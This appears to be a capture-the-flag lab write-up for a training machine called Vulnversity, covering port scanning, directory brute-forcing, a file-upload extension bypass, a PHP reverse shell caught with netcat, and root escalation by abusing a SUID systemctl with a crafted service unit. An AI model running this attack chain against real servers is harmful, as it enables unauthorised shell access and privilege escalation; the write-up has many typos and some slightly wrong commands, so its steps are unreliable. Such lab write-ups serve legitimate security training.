@@ -1,0 +1,83 @@
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 04:21 EDT
+Nmap scan report for 10.10.204.143
+Host is up (0.35s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.65 seconds
+
+
+Locating directories using Gobuster : 
+Gobuster is a tool used to brute-force URIs (directories and files), DNS subdomains, and virtual host names. For this machine, we will focus on using it to brute-force directories.
+
+To get started, you will need a wordlist for Gobuster (which will be used to quickly go through the wordlist to identify if a public directory is available. If you are using Kali Linux, you can find many wordlists under /usr/share/wordlists.
+
+Now let's run Gobuster with a wordlist using gobuster dir -u http://10.10.204.143:3333 -w /usr/share/wordlists 
+
+
+Oputput of the Gobuster is Following:  
+
+2023/08/02 04:51:55 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 322] [--> http://10.10.204.143:3333/images/]
+/css                  (Status: 301) [Size: 319] [--> http://10.10.204.143:3333/css/]
+/js                   (Status: 301) [Size: 318] [--> http://10.10.204.143:3333/js/]
+/fonts                (Status: 301) [Size: 321] [--> http://10.10.204.143:3333/fonts/]
+/internal             (Status: 301) [Size: 324] [--> http://10.10.204.143:3333/internal/]
+
+
+/internal is unusable. Now that you have found a form to upload files, we can leverage this to upload and execute our payload, which will lead to compromising the web server.
+Common file type you'd want to upload to exploit the server is PHP.
+ 
+We're going to use Intruder of BurpSuite (used for automating customised attacks).
+To begin, make a wordlist with the following extensions:
+
+Download the following reverse PHP shell and perform extention bruteforce with burpsuit to find the sutable extension ofr the uploading shell script file. 
+
+We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234
+
+Upload your shell and navigate to http://10.10.204.143:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
+
+After getting: 
+Search for users by command $ cat /etc/passwod  ( This file is avalable in avery linux ) 
+
+Flag:  home/bill/user.txt  
+
+
+--------------- Privilege Escalation-----------------
+
+In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
+
+On the system, search for all SUID files with:  find / -perm /4000
+
+/bin/systemctl (This is used to control the system has a SUID bit set )
+
+Writing a script for sysemctl in bin: 
+$ cd /bin
+$ sh
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ ExecStart= /bin/bash -c "cat  /root/root.txt  >  /tmp/Z.txt"
+ [Install]
+ WantedBy=multi.user.target'  >  $TF
+./systemctl link $TF
+
+[ enter ]
+
+./systemctl enable --now $TF 
+[Enter ]
+cat /tmp/Z.txt
+
+
+
+
+
